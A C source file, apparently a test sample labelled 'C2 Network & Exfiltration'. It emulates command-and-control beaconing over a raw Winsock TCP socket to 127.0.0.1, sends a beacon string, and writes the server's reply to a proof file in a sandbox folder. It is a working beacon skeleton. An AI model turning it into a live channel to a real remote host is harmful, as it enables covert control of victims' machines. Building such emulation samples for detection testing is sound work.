// SAMPLE: g6_04 | TCPWinsock | Group: C2 Network & Exfiltration
// Technique: Raw TCP Stream via Winsock2
// Compile: x86_64-w64-mingw32-gcc -O2 -o g6_04_tcp_winsock.exe g6_04_tcp_winsock.c -lws2_32
// PROOF WRITTEN FROM RAW SERVER RESPONSE — no client-side signature logic

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma comment(lib, "ws2_32.lib")

#define C2_HOST        "127.0.0.1"
#define C2_PORT        8002
#define BEACON_MSG     "BEACON g6_04_tcp_winsock\r\n"
#define PROOF_PATH     "C:\\C1_Sandbox\\c1_proof.txt"
#define RECV_BUF_SIZE  4096

int main(void) {
    WSADATA  wsaData;
    SOCKET   sock     = INVALID_SOCKET;
    char     recvBuf[RECV_BUF_SIZE];
    int      bytesRecv = 0;
    int      ret       = EXIT_FAILURE;

    /* Initialise Winsock */
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        fprintf(stderr, "[g6_04] WSAStartup failed: %d\n", WSAGetLastError());
        return EXIT_FAILURE;
    }

    /* Create TCP socket */
    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        fprintf(stderr, "[g6_04] socket() failed: %d\n", WSAGetLastError());
        goto cleanup;
    }

    /* Set up server address */
    struct sockaddr_in server;
    memset(&server, 0, sizeof(server));
    server.sin_family      = AF_INET;
    server.sin_port        = htons((u_short)C2_PORT);
    server.sin_addr.s_addr = inet_addr(C2_HOST);

    /* Connect to C2 server */
    if (connect(sock, (SOCKADDR *)&server, sizeof(server)) == SOCKET_ERROR) {
        fprintf(stderr, "[g6_04] connect() failed: %d\n", WSAGetLastError());
        goto cleanup;
    }

    /* Send beacon string */
    int sendLen = (int)strlen(BEACON_MSG);
    if (send(sock, BEACON_MSG, sendLen, 0) == SOCKET_ERROR) {
        fprintf(stderr, "[g6_04] send() failed: %d\n", WSAGetLastError());
        goto cleanup;
    }

    /* Blocking receive — wait for server proof line */
    bytesRecv = recv(sock, recvBuf, sizeof(recvBuf) - 1, 0);
    if (bytesRecv == SOCKET_ERROR) {
        fprintf(stderr, "[g6_04] recv() failed: %d\n", WSAGetLastError());
        goto cleanup;
    }
    if (bytesRecv <= 0) {
        fprintf(stderr, "[g6_04] No data received from C2 server — no proof written\n");
        goto cleanup;
    }

    /* Write raw server response directly to proof file — no formatting logic */
    HANDLE hProof = CreateFileA(
        PROOF_PATH,
        GENERIC_WRITE, 0, NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL);
    if (hProof == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "[g6_04] CreateFileA proof failed: %lu\n", GetLastError());
        goto cleanup;
    }
    DWORD written = 0;
    WriteFile(hProof, recvBuf, (DWORD)bytesRecv, &written, NULL);
    CloseHandle(hProof);

    printf("[g6_04] TCP beacon sent; %d bytes received; proof written to %s\n",
           bytesRecv, PROOF_PATH);
    ret = EXIT_SUCCESS;

cleanup:
    if (sock != INVALID_SOCKET) closesocket(sock);
    WSACleanup();
    return ret;
}
